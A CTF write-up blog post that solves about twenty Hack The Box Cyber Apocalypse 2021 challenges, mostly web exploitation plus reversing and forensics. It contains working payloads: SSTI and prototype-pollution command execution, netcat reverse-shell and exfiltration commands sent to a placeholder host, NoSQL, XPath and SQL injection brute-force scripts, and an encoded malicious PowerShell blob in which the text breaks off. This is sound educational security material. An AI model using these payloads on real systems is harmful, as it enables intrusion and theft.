---
title: "hack the box - cyber apocalypse ctf '21"
date: 2021-04-24T08:41:34+02:00
categories:
- writeup
- ctf
- htb
- hackthebox
- CyberApocalypseCTF21
- 2021
---

{{< figure src="/images/htbcyperapocalypse21/htb_cyberapoc.png" >}}

# foreword

The [HTB Cyber Apocalypse 2021](https://www.hackthebox.eu/cyber-apocalypse-ctf-2021) event was a nice and polished [CTF](https://ctf.hackthebox.eu/ctf/82). Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo's HTB! Here are the solutions for the ~20 challenges I managed to solve.

# solutions

## category - web

### - BlitzProp

- Category: Web
- Difficulty: 1/4
- Files: Web app source & build env

{{< figure src="/images/htbcyperapocalypse21/blitzprop_1.png" >}}

The challenge landing page already had a hint in the "ASTa la vista baby" song. Checking out the challenge source, the interesting code might not be immediately obvious.

```javascript
// file challenge/routes/index.js

const path              = require('path');
const express           = require('express');
const pug               = require('pug');
const { unflatten }     = require('flat');
const router            = express.Router();

// ... snip ...

router.post('/api/submit', (req, res) => {
    const { song } = unflatten(req.body);   // <-- #1

    if (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {
        return res.json({
            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })
        }); // <-- #2
    } else {
        return res.json({
            'response': 'Please provide us with the name of an existing song.'
        });
    }
});

module.exports = router;
```

The interesting calls are to `unflatten()` (#1) which (potentially) contains a [prototype pollution vuln](https://snyk.io/vuln/SNYK-JS-FLAT-596927) and to `pug.compile()` (#2). At first glance the `pug.compile()` call seems fine as you don't control the `user` that gets passed in. However, combined with a prototype pollution, we can perform some [AST injection](https://blog.p6.is/AST-Injection/#Pug) in `pug`! We just need to pollute `Object.__proto__.block` so that `pug.compile()` interprets `block.line`.

PoC Request:

```text
POST /api/submit HTTP/1.1
Host: 138.68.147.232:32661
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.147.232:32661/
Content-Type: application/json
Origin: http://138.68.147.232:32661
Content-Length: 22
Connection: close

{
    "song.name":"asdasd",
    "Object.__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`$command`)"
    }
}
```

Command execution was blind, so I ran commands redirecting output to a file in the static folder, requesting that from the web server afterwards. So to get the flag using the PoC, I first ran `ls / > /app/static/out.txt`.

{{< figure src="/images/htbcyperapocalypse21/blitzprop_2.png" >}}

And then `cat /flagk5NDpd`.

{{< figure src="/images/htbcyperapocalypse21/blitzprop_3.png" >}}

Flag: `CHTB{p0llute_with_styl3}`

### - Inspector Gadget

- Category: Web
- Difficulty: 1/4
- Files: None

For this challenge, you just had to poke around in the console to reveal parts of the flag.

{{< figure src="/images/htbcyperapocalypse21/inspector_gadget_1.png" >}}

{{< figure src="/images/htbcyperapocalypse21/inspector_gadget_2.png" >}}

{{< figure src="/images/htbcyperapocalypse21/inspector_gadget_3.png" >}}

Flag: `CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}`

### - Daas

- Category: Web
- Difficulty: 1/4
- Files: None

Fuzzing this challenge you'd realise it’s a Laravel app with debug mode enabled. A recent publication revealed how to get RCE via Ignition (the fancy debug helper used in Laravel helps). I used this exploit for RCE: <https://github.com/ambionics/laravel-exploits>

{{< figure src="/images/htbcyperapocalypse21/daas_1.png" >}}

I created a `.phar` file with [`phpggc`](https://github.com/ambionics/phpggc) to run `nc <ip> 4444 -e /bin/bash` to get a shell (didn't _really_ need this but whatever). Finding the flag was easy with that though.

{{< figure src="/images/htbcyperapocalypse21/daas_2.png" >}}

Flag: `CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}`

### - MiniSTRyplace

- Category: Web
- Difficulty: 1/4
- Files: Web app source & build env

Reviewing the `index.php` file you'd see a classic `include()` call with some simple filtering where `../` is removed. To bypass it, just use `....//`.

```php
<html>

    // ... snip ...

    <?php
    $lang = ['en.php', 'qw.php'];
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
    ?>
    </body>
</html>
```

To get the flag, set `lang` to `GET /?lang=....//....//....//....//....//....//....//....//....//....//flag`

Flag: `CHTB{b4d_4li3n_pr0gr4m1ng}`

### - Caas

- Category: Web
- Difficulty: 2/4
- Files: Web app source & build env

A slightly more complex web app, but the interesting code was in `challenge/models/CommandModel.php`.

```php
<?php
class CommandModel
{
    public function __construct($url)
    {
        $this->command = "curl -sL " . escapeshellcmd($url);
    }

    public function exec()
    {
        exec($this->command, $output);
        return $output;
    }
}
```

`escapeshellcmd()` may seem scary here, but it provides nothing in terms of security when just appending to a command like `curl`. They provide `curl -sL `, so with a POST request we append `-F data=@/flag http://host` to have the curl command post the `/flag` file to our host.

{{< figure src="/images/htbcyperapocalypse21/caas_1.png" >}}

{{< figure src="/images/htbcyperapocalypse21/caas_2.png" >}}

Flag: `CHTB{f1le_r3trieval_4s_a_s3rv1ce}`

### - Wild Goose Hunt

- Category: Web
- Difficulty: 2/4
- Files: Web app source & build env

A code review shows `mongoose` is in use, and the login endpoint does not sanitize user credentials.

```javascript
// file challenge/models/User.js

const mongoose = require('mongoose');
const Schema   = mongoose.Schema;

let User = new Schema({
    username: {
        type: String
    },
    password: {
        type: String
    }
}, {
    collection: 'users'
});

module.exports = mongoose.model('User', User);
```

```javascript
// challenge/routes/index.js

const express = require('express');
const router  = express.Router();
const User    = require('../models/User');

// ... snip ...

router.post('/api/login', (req, res) => {
    let { username, password } = req.body;

    if (username && password) {
        return User.find({ 
            username,
            password
        })
            .then((user) => {
                if (user.length == 1) {
                    return res.json({logged: 1, message: `Login Successful, welcome back ${user[0].username}.` });
                } else {
                    return res.json({logged: 0, message: 'Login Failed'});
                }
            })
        .catch(() => res.json({ message: 'Something went wrong'}));
    }
    return res.json({ message: 'Invalid username or password'});
});

module.exports = router;
```

Using `username=admin&password[$ne]=` as credentials would log you in as the password is obviously not empty :P

{{< figure src="/images/htbcyperapocalypse21/wild_goose_hunt_1.png" >}}

Instead of using `$ne`, we can use `$regex` to match a part of the password in a loop in a script. If the regex matches we'll be logged in, if not we'll get Login Failed. My script to pwn the password (and get the flag) was:

```python
import requests
import string

burp0_url = "http://178.62.113.165:31453/api/login"
burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0",
        "Accept": "*/*", 
        "Accept-Language": "en-US,en;q=0.5", 
        "Accept-Encoding": "gzip, deflate", 
        "Referer": "http://178.62.113.165:31453/", 
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", 
        "Origin": "http://178.62.113.165:31453", 
        "Connection": "close"
}

password = "CHTB{"

while True:
    for c in string.ascii_lowercase + string.digits + "_" + "}":
        if c in ['*','+','.','?','|']:
            continue

        tpass = f"{password}{c}"
        print(f"trying: {tpass}")

        burp0_data = {"username": "admin", "password[$regex]": f"^{tpass}"}
        r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

        if "Login Successful" in r.text:
            password = tpass
            print(f"password: {tpass}")

            if "}" in tpass:
                print(f"flag: {tpass}")
```

Flag: `CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}`

### - E.Tree

- Category: Web
- Difficulty: 2/4
- Files: XML file

XPath injection. Urgh. We get an XML file with two `staff` keys that also have a `selfDestructCode` key with the `CHTB{` flag format.

```xml
<?xml version="1.0" encoding="utf-8"?>

<military>
    <district id="confidential">
    
        <staff>
            <name>staff1</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
        </staff>

        // ... snip ...
       
    </district>

    <district id="confidential">
    
        <staff>
            <name>staff13</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
            <selfDestructCode>CHTB{f4k3_fl4g</selfDestructCode>
        </staff>
        
    </district>

    <district id="confidential">
    
  
        <staff>
            <name>confidential</name>
            <age>confidential</age>
            <rank>confidential</rank>
            <kills>confidential</kills>
            <selfDestructCode>_f0r_t3st1ng}</selfDestructCode>
        </staff>

    </district>
</military>
```

Sending a single quote `'` in the `search` param reveals that the XML could not be evaluated with an `lxml.etree.XPathEvalError`. If the search was successful, the app would respond with `This millitary staff member exists.`.

{{< figure src="/images/htbcyperapocalypse21/e_tree_1.png" >}}

My XPath is terrible, so I wrote a script to test expressions.

```python
from lxml import etree
import sys

# ' or substring(//*/selfDestructCode,1,1)=C and '1
# ((//staff[selfDestructCode])[1])[starts-with(selfDestructCode, 'C')]
q = f".//*[name='{sys.argv[1]}']"
#q = f'{sys.argv[1]}'
print(f'q: {q}')

root = etree.parse('military.xml')
res = root.xpath(q)

try:
    iterator = iter(res)
except TypeError:
    print(res)
else:
    for r in res:
        print(etree.tostring(r, pretty_print=True))
```

My final payload was `x' or ((//staff[selfDestructCode])[1])[starts-with(selfDestructCode, 'C')] or name='x` where `1` was the first `selfDestructCode` match and `C` the first character of the flag. My pwn script needed to have the position modified to target each `selfDestructCode`, but that was a minor problem.

```python
import requests
import string

burp0_url = "http://178.62.70.150:30594/api/search"

burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0", 
        "Accept": "*/*", 
        "Accept-Language": "en-US,en;q=0.5", 
        "Accept-Encoding": "gzip, deflate", 
        "Referer": "http://178.62.70.150:30594/", 
        "Content-Type": "application/json", 
        "Origin": "http://178.62.70.150:30594", 
        "Connection": "close"
}

#flag = "CHTB{"
#flag = "CHTB{Th3"
#flag = "CHTB{Th3_3xTr4_l3v3l_"
flag = ""
#flag = "4Cc3s"
#flag = "4Cc3s$"
#flag = "4Cc3s$_c0nTr0l}"

code_pos = 2

while True:
    for c in string.printable:

        if c in ['\'']:
            continue

        attempt = f'{flag}{c}'
        print(f'flag: {flag}, trying: {attempt}')

        burp0_json={"search": f"x' or ((//staff[selfDestructCode])[{code_pos}])[starts-with(selfDestructCode, '{attempt}')] or name='x"}
        res = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)

        if "This millitary staff member exists." in res.text:
            flag = attempt
            break
```

Flag: `CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}`

### - The Galactic Times

- Category: Web
- Difficulty: 2/4
- Files: Web app source & build env

I _think_ this challenge was broken. I spent a bunch of time on an XSS vector to get the the `/alien` endpoint to leak the flag via the Chrome session driven with `puppeteer`, until I noticed that there was also an `alien.html` in the `static/` directory with the flag. lol

The `/alien` endpoint looked as follows:

```javascript
const bot = require('../bot');

let db;

async function router (fastify, options) {

    // ... snip ...

    fastify.get('/alien', async (request, reply) => {
        if (request.ip != '127.0.0.1') {
            return reply.code(401).send({ message: 'Only localhost is allowed'});
        }
        return reply.sendFile('alien.html');
    });

    // ... snip ...
}

module.exports = database => {
    db = database;
    return router;
};
```

{{< figure src="/images/htbcyperapocalypse21/the_galactic_times_1.png" >}}

{{< figure src="/images/htbcyperapocalypse21/the_galactic_times_2.png" >}}

Flag: `CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}`

### - emoji voting

- Category: Web
- Difficulty: 2/4
- Files: Web app source & build env

First, take a moment to appreciate this landing page :D

{{< figure src="/images/htbcyperapocalypse21/emoji_voting_1.png" >}}

The list endpoint had an `order` parameter which defaulted to `count DESC`. However, this value flowed into a raw database query (#1).

```javascript
const sqlite = require('sqlite-async');
const crypto = require('crypto');

class Database {
    constructor(db_file) {
        this.db_file = db_file;
        this.db = undefined;
    }
    
   // ... snip ... 

    async getEmojis(order) {
        // TOOD: add parametrization
        return new Promise(async (resolve, reject) => {
            try {
                let query = `SELECT * FROM emojis ORDER BY ${ order }`; // <-- #1
                resolve(await this.db.all(query));
            } catch(e) {
                reject(e);
            }
        });
    }
}

module.exports = Database;
```

`ORDER BY` injections are a little tricky, and by default it looked like sqlmap did not detect this automatically. I took a little bit of time to try and get sqlmap to detect & pwn it, but did not win. This is totally something that I think I should try and add. Anyways, I wrote a custom script instead. To help understand the query, checkout [this post](https://portswigger.net/support/sql-injection-in-the-query-structure).

To get the flag we needed to enum two values. The database table name where the flag is stored, and the flag itself. The table name was being randomised, as you’d see in the `flag_${ rand };` references where `${rand}` was a JavaScript variable.

```sql
DROP TABLE IF EXISTS emojis;
DROP TABLE IF EXISTS flag_${ rand };

CREATE TABLE IF NOT EXISTS flag_${ rand } (
    flag TEXT NOT NULL
);

INSERT INTO flag_${ rand } (flag) VALUES ('CHTB{f4k3_fl4g_f0r_t3st1ng}');

CREATE TABLE IF NOT EXISTS emojis (
    id      INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
    emoji   VARCHAR(255),
    name    VARCHAR(255),
    count   INTEGERT
);

INSERT INTO emojis (emoji, name, count) VALUES 
    ('👽', 'alien', 13),
    ('🛸', 'flying saucer', 3),
    ('👾', 'alien monster', 0),
    ('💩', '👇 = human', 118),
    ('🚽', '👇 = human', 19),
    ('🪠', '👇 = human', 2),
    ('🍆', 'eggplant', 69),
    ('🍑', 'peach', 40),
    ('🍌', 'banana', 21),
    ('🐶', 'dog', 80),
    ('🐷', 'pig', 37),
    ('👨', 'homo idiotus', 124)
```

My SQL injection payload was `(CASE WHEN(SELECT SUBSTR(tbl_name, {pos}, 1) FROM sqlite_master WHERE type='table' and tbl_name like 'flag%')='{c}' THEN emoji ELSE id END) ASC` where `pos` was the character position and `c` the character I was brute forcing. If char `c` at position `pos` was correct, the results would have been sorted by emojis, and if not, sorted by `id`. This was the oracle used to determine true/false values and ultimately leak the table and flag values.

I used two slightly modified scripts to use different character sets. The table rand value was hex only, the flag was a larger set. The payload was also slightly different once the table name was known.

```python

# file pwn_table.py

import requests
import string

burp0_url = "http://46.101.80.23:31737/api/list"
burp0_cookies = {"PHPSESSID": "2fb52e27704a6f06e7b528f47df0dfd9"}
burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0", 
        "Accept": "*/*", 
        "Accept-Language": "en-US,en;q=0.5", 
        "Accept-Encoding": "gzip, deflate", 
        "Referer": "http://46.101.23.157:30629/", 
        "Content-Type": "application/json", 
        "Origin": "http://46.101.23.157:30629", 
        "Connection": "close"
}

table_name = () # eventually: flag_5d02dc7099 
pos = 1

def is_true(r):
    return r.json()[0]['id'] == 7

def is_false(r):
    return r.json()[0]['id'] == 1 

while True:

    for c in "a" + "b" + "c" + "d" + "e" + "f" + "l" + "g" + "_" + string.digits:

        print(f'have: {"".join(table_name)} => trying: {c}')

        query = f"(CASE WHEN(SELECT SUBSTR(tbl_name, {pos}, 1) FROM sqlite_master WHERE type='table' and tbl_name like 'flag%')='{c}' THEN emoji ELSE id END) ASC"

        burp0_json={ "order": query }
        res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)

        if is_true(res):
            table_name = table_name + (c,)
            pos+=1
            continue
```

```python
import requests
import string
import sys

burp0_url = "http://46.101.23.157:30629/api/list"
burp0_cookies = {"PHPSESSID": "2fb52e27704a6f06e7b528f47df0dfd9"}
burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0", 
        "Accept": "*/*", 
        "Accept-Language": "en-US,en;q=0.5", 
        "Accept-Encoding": "gzip, deflate", 
        "Referer": "http://46.101.23.157:30629/", 
        "Content-Type": "application/json", 
        "Origin": "http://46.101.23.157:30629", 
        "Connection": "close"
}

flag = ()
pos = 1

def is_true(r):
    return r.json()[0]['id'] == 7

def is_false(r):
    return r.json()[0]['id'] == 1 

while True:
    for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation:

        if len(c.strip()) <= 0 or c in ['\'']:
            continue

        print(f'pos: {pos} => have: {"".join(flag)} => trying: {c}')
        query = f"(CASE WHEN(SELECT SUBSTR(flag, {pos}, 1) FROM flag_5d02dc7099 LIMIT 1)='{c}' THEN emoji ELSE id END) ASC;"

        burp0_json={ "order": query }
        res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)

        if is_true(res):
            flag = flag + (c,)
            pos+=1
            continue

        if '}' in ''.join(flag):
            print(f'flag: {"".join(flag)}')
            sys.exit(0)
```

Flag: `CHTB{order_me_this_juicy_info}`

### - Starfleet

- Category: Web
- Difficulty: 3/4
- Files: Web app source & build env

A field was expecting an email address to send an email to, enrolling you to the starfleet academy. A code review showed that the email address was populated in a string, and `nunjucks` used to render template (#1) in what looked like a typical template injection.

```javascript
const nodemailer = require('nodemailer');
const nunjucks   = require('nunjucks');

module.exports = {

    async sendEmail(emailAddress) {
        return new Promise(async (resolve, reject) => {
            try {
                let message = {
                    to: emailAddress,
                    subject: 'Enrollment is now under review ✅',
                };

                if (process.env.NODE_ENV === 'production' ) {

                    let gifSrc = 'minimakelaris@hackthebox.eu';
                    
                    // #1
                    message.html = nunjucks.renderString(`
                        <p><b>Hello</b> <i>${ emailAddress }</i></p>
                        <p>A cat has been deployed to process your submission 🐈</p><br/>
                        <img width="500" height="350" src="cid:{{ gifSrc }}"/></p>
                        `, { gifSrc }
                    );

                    message.attachments = [
                        {
                            filename: 'minimakelaris.gif',
                            path: __dirname + '/../assets/minimakelaris.gif',
                            cid: gifSrc
                        }
                    ];

                    let transporter = nodemailer.createTransport({
                        host: 'smtp.gmail.com',
                        port: 465,
                        secure: true,
                        auth: {
                            user: 'cbctf.2021.web.newjucks@gmail.com',
                            pass: '[REDACTED]',
                        },
                        logger: true
                    });

                    transporter.sendMail(message);

                    transporter.close();

                    resolve({ response: 'The email has been sent' });

                // ... snip ...
              
            } catch(e) {
                reject({ response: 'Something went wrong', 'err': e, 'err.msg': e.message });
            }
        })
    }
};
```

[This](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) post described pretty much exactly that. In our case the injection was blind, and an email address was always required. Thankfully we could specify template tags (`{{ }}`) after an email address to bypass that validation, while injecting a shell command.

The challenge flag was protected but made available through a binary at `/readflag` (a simple setuid bin that would just cat the protected flag). I'm not sure why that effort was made, as the method I used meant I could run any OS command. Anyways. My final request looked like this:

```txt
POST /api/enroll HTTP/1.1
Host: 138.68.178.56:32689
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.178.56:32689/
Content-Type: application/json
Origin: http://138.68.178.56:32689
Content-Length: 169
Connection: close

{"email":"leon@leon {{ range.constructor(\"console.log(global.process.mainModule.require('child_process').execSync('/readflag | nc <host> 4444').toString())\")() }}"}
```

{{< figure src="/images/htbcyperapocalypse21/starfleet_1.png" >}}

Flag: `CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}`

## category - reversing

### - Authenticator

- Category: Reversing
- Difficulty: 1/4
- Files: ELF 64-bit LSB pie executable

Running the program you have to enter an Alien ID, which could be retrieved in a dissasembler as an argument passed to `strcmp()`

{{< figure src="/images/htbcyperapocalypse21/authenticator_1.png" >}}

{{< figure src="/images/htbcyperapocalypse21/authenticator_2.png" >}}

Entering `11337` would then prompt for a `Pin:`.

A function called `checkpin()` took the input you entered at the `Pin:` prompt, and ran an XOR 9 operation over each character, checking that the character matched a value in the `al` register.

{{< figure src="/images/htbcyperapocalypse21/authenticator_3.png" >}}

To test what the values were being compared to, I added a breakpoint before the `cmp BYTE PTR [rbp-0x1d], al` operation and printed the register. Having entered a long string at the `Pin:` prompt, I also set the value in the `al` register to the expected value to see what future correct values were.

{{< figure src="/images/htbcyperapocalypse21/authenticator_4.png" >}}

Using the `jsdec` decompiler in Cutter, I also saw the string that was being compared to after running the XOR operation on the input buffer. So, to reveal the flag I just wrote a python one-liner to XOR that string.

{{< figure src="/images/htbcyperapocalypse21/authenticator_5.png" >}}

```text
>>> ''.join([chr((ord(x)) ^ 9) for x in "}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:"])
'th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3'
```

Flag: `CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}`

### - Passphrase

- Category: Reversing
- Difficulty: 1/4
- Files: ELF 64-bit LSB pie executable

A quick one. The program asks for a passphrase.

{{< figure src="/images/htbcyperapocalypse21/passphrase_1.png" >}}

Disassembling the binary, you'd see a bunch of bytes being moved that follow the typical flag format in between a bunch of other valid calls.

{{< figure src="/images/htbcyperapocalypse21/passphrase_2.png" >}}

Enter those as the passphrase and you're done!

{{< figure src="/images/htbcyperapocalypse21/passphrase_3.png" >}}

Flag: `CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}`

## category - Forensics

### - Key Mission

- Category: Forensics
- Difficulty: 1/4
- Files: Pcap

We get a USB pcap for a "BlackWidow Ultimate 2016" Keyboard. Key inputs are in a "HID Data" field and not `usb.capdata` which I was used to.

{{< figure src="/images/htbcyperapocalypse21/key_mission_1.png" >}}

Without knowing the field name to get the HID Data, I learnt that you can output as `pdml` using `tshark` (`tshark -r key_mission.pcap -T pdml`) to get all of the fields in a packet that you can use with `-T fields` for the `-e` flag.

Anyways, extract keypresses with `tshark -r key_mission.pcap -T fields -e usbhid.data | sed 's/../:&/g2' > presses` and use [ctf-usb-keyboard-parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser) to convert them to ASCII.

{{< figure src="/images/htbcyperapocalypse21/key_mission_2.png" >}}

Flag: `CHTB{a_plac3_fAr_fAr_away_fr0m_earth}`

### - Invitation

- Category: Forensics
- Difficulty: 1/4
- Files: Word Docm Document

We get a macro enabled word document, so I used [ViperMonkey](https://github.com/decalage2/ViperMonkey) to extract and analyse it. The resultant PowerShell command was extracted can be seen on CyberChef [here](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Decode_text('UTF-16LE%20(1200)')&input=TGdBZ0FDZ0FJQUFrQUZBQWN3Qm9BRzhBYlFCRkFGc0FOQUJkQUNzQUpBQndBSE1BYUFCdkFFMEFaUUJiQURNQU1BQmRBQ3NBSndCNEFDY0FLUUFnQUNnQUlBQmJBSE1BZEFCeUFHa0FiZ0JIQUYwQU9nQTZBR29BYndCcEFHNEFLQUFuQUNjQUlBQXNBQ0FBS0FCYkFGSUFSUUJIQUdVQVdBQmRBRG9BT2dCTkFHRUFWQUJEQUVnQVJRQlRBQ2dBSUFBaUFDa0FKd0I0QUNjQUt3QmRBRE1BTVFCYkFFUUFTUUJzQUV3QVpRQklBSE1BSkFBckFGMEFNUUJiQUVRQWFRQk1BRXdBWlFCb0FITUFKQUFnQUNnQUpnQjhBQ0FBS1FBMEFETUFYUUJTQUVFQWFBQmpBRnNBWFFCSEFHNEFTUUJTQUZRQWN3QmJBQ3dBSndCMEFGZ0FhZ0FuQUNnQVpRQkRBRUVBVEFCUUFFVUFVZ0F1QUNrQUp3QWtBQ2NBTEFBbkFIY0FjUUJwQUNjQUtBQmxBRU1BUVFCTUFGQUFSUUJTQUM0QUtRQW5BRHNBZEFCWUFDY0FLd0FuQUdvQVpRQnlBR0VBWHdCekFHTUFid0JrQUd3QVlRQnRBQ2NBS3dBbkFIc0FRZ0FuQUNzQUp3QlVBQ2NBS3dBbkFFZ0FRd0IwQUZnQWFnQWdBQ2NBS3dBbkFEMEFJQUJ3QUNjQUt3QW5BR2NBWlFCeUFIY0FjUUJwQUNjQUtBQWlBQ0FBTEFBbkFDNEFKd0FnQUN3QUp3QlNBQ2NBS3dBbkFHa0FSd0JJQUZRQWRBQlBBR3dBSndBckFDY0FaUUJtQUhRQUp3QWdBQ2tBSUFCOEFDQUFSZ0J2QUZJQVJRQmhBRU1BU0FBdEFFOEFRZ0JLQUdVQVl3QlVBQ0FBZXdBa0FGOEFMZ0JXQUVFQVRBQlZBRVVBZlFBZ0FDa0FLUUFnQUNBQUtRQUtBQW9BQ2dBa0FIQUFZUUI1QUd3QWJ3QmhBR1FBUWdCaEFITUFaUUEyQURRQUlBQTlBQ0FBSWdCS0FFRUFRZ0JxQUVFQVJ3QjNBRUVBWVFCUkFFSUFiQUJCQUVjQU5BQkJBR1FBUVFCQkFHY0FRUUJFQURBQVFRQkpBRUVBUWdCUEFFRUFSd0JWQUVFQVpBQjNBRUVBZEFCQkFFVUFPQUJCQUZrQVp3QkNBSEVBUVFCSEFGVUFRUUJaQUhjQVFnQXdBRUVBUXdCQkFFRUFWUUIzQUVJQU5RQkJBRWdBVFFCQkFHUUFRUUJDQUd3QVFRQkhBREFBUVFCTUFHY0FRZ0JQQUVFQVJ3QlZBRUVBWkFCQkFFRUFkUUJCQUVZQVRRQkJBR0lBZHdCQ0FHb0FRUUJIQUhNQVFRQmFBRkVBUWdBd0FFRUFTQUJOQUVFQVRBQm5BRUlBVlFCQkFFVUFUUUJCQUZVQVFRQkNBRVFBUVFCSEFIY0FRUUJoQUZFQVFnQnNBRUVBUndBMEFFRUFaQUJCQUVFQWJ3QkJBRU1BU1FCQkFFMEFVUUJCQURVQVFRQkVBRmtBUVFCTUFHY0FRUUI1QUVFQVJBQk5BRUVBVFFCM0FFRUFlZ0JCQUVNQU5BQkJBRTRBVVFCQkFEQUFRUUJEQURRQVFRQk5BR2NBUVFCcEFFRUFRd0IzQUVFQVRnQkJBRUVBTUFCQkFFUUFVUUJCQUU0QVFRQkJBSEFBUVFCRUFITUFRUUJLQUVFQVFnQjZBRUVBU0FCUkFFRUFZd0JuQUVJQWJBQkJBRWNBUlFCQkFHSUFVUUJCQUdjQVFRQkVBREFBUVFCSkFFRUFRUUJyQUVFQVJ3Qk5BRUVBWWdCQkFFSUFjQUJCQUVjQVZRQkJBR0lBWndCQ0FEQUFRUUJEQURRQVFRQlNBSGNBUWdCc0FFRUFTQUJSQUVFQVZRQjNBRUlBTUFCQkFFZ0FTUUJCQUZvQVVRQkNBR2dBUVFCSEFEQUFRUUJMQUVFQVFRQndBRUVBUkFCekFFRUFWd0IzQUVJQWFRQkJBRWdBYXdCQkFHUUFRUUJDQUd3QVFRQkdBSE1BUVFCWUFGRUFRZ0JrQUVFQVF3QlJBRUVBV1FCbkFFSUFOUUJCQUVnQVVRQkJBRm9BVVFCQ0FIb0FRUUJEQUVFQVFRQlFBRkVBUVFCbkFFRUFSQUJCQUVFQVRBQm5BRUVBZFFCQkFFUUFXUUJCQUU0QVVRQkJBREVBUVFCRUFFMEFRUUJPQUZFQVFnQTRBRUVBUXdCVkFFRUFaUUIzQUVFQWR3QkJBRWdBTUFCQkFFOEFkd0JDQURNQVFRQkhBR2NBUVFCaEFGRUFRZ0J6QUVFQVJ3QlZBRUVBU3dCQkFFRUFid0JCQUVNQVVRQkJBR0VBVVFCQkFHY0FRUUJFQURBQVFRQkpBRUVBUVFCckFFRUFTQUJOQUVFQVpBQkJBRUlBZVFCQkFFY0FWUUJCQUZrQVVRQkNBSFFBUVFCREFEUUFRUUJWQUdjQVFnQnNBRUVBUndCRkFFRUFXZ0JCQUVFQWJ3QkJBRU1BVVFCQkFGa0Fad0JDQURVQVFRQklBRkVBUVFCYUFGRUFRZ0I2QUVFQVF3QjNBRUVBU1FCQkFFRUFkd0JCQUVNQWR3QkJBRWtBUVFCQkFHc0FRUUJIQUVrQVFRQmxBRkVBUWdBd0FFRUFSd0JWQUVFQVl3QjNBRUVBZFFCQkFFVUFkd0JCQUZvQVVRQkNBSFVBUVFCSEFHTUFRUUJrQUVFQVFnQnZBRUVBUXdCckFFRUFTd0JSQUVFQVp3QkJBRU1BTUFCQkFHSUFad0JDQUd3QVFRQkRBRUVBUVFCTkFFRUFRUUJ3QUVFQVNBQnpBRUVBVHdCM0FFRUFhd0JCQUVjQVVRQkJBRmtBVVFCQ0FEQUFRUUJIQUVVQVFRQkpBRUVBUVFBNUFFRUFRd0JCQUVFQVN3QkJBRUlBVHdCQkFFY0FWUUJCQUdRQWR3QkJBSFFBUVFCRkFEZ0FRUUJaQUdjQVFnQnhBRUVBUndCVkFFRUFXUUIzQUVJQU1BQkJBRU1BUVFCQkFFd0FVUUJDQUZVQVFRQklBR3NBUVFCakFFRUFRZ0JzQUVFQVJRQTBBRUVBV1FCUkFFSUFkQUJCQUVjQVZRQkJBRWtBUVFCQ0FGUUFRUUJJQUdzQVFRQmpBSGNBUWdBd0FFRUFSd0JWQUVFQVlnQlJBRUVBZFFCQkFFWUFVUUJCQUZvQVVRQkNBRFFBUVFCSUFGRUFRUUJNQUdjQVFnQkNBRUVBUmdCTkFFRUFVUUIzQUVJQVNnQkJBRVVBYXdCQkFGSUFVUUJDQUhVQVFRQkhBRTBBUVFCaUFIY0FRZ0JyQUVFQVJ3QnJBRUVBWWdCbkFFSUFiZ0JCQUVNQWF3QkJBRXdBWndCQ0FFZ0FRUUJIQUZVQVFRQmtBRUVBUWdCVUFFRUFTQUJSQUVFQVl3Qm5BRUlBY0FCQkFFY0FOQUJCQUZvQWR3QkJBRzhBUVFCREFGRUFRUUJaQUdjQVFnQTFBRUVBU0FCUkFFRUFXZ0JSQUVJQWVnQkJBRU1BZHdCQkFFMEFRUUJCQUhNQVFRQkRBRUVBUVFCS0FFRUFRZ0J3QUVFQVF3QnJBRUVBVHdCM0FFRUFhd0JCQUVnQVRRQkJBRm9BVVFCQ0FIVUFRUUJIQUZFQVFRQlpBR2NBUWdCb0FFRUFSd0JOQUVFQVlRQjNBRUVBWndCQkFFUUFNQUJCQUVrQVFRQkJBRzhBUVFCSEFHc0FRUU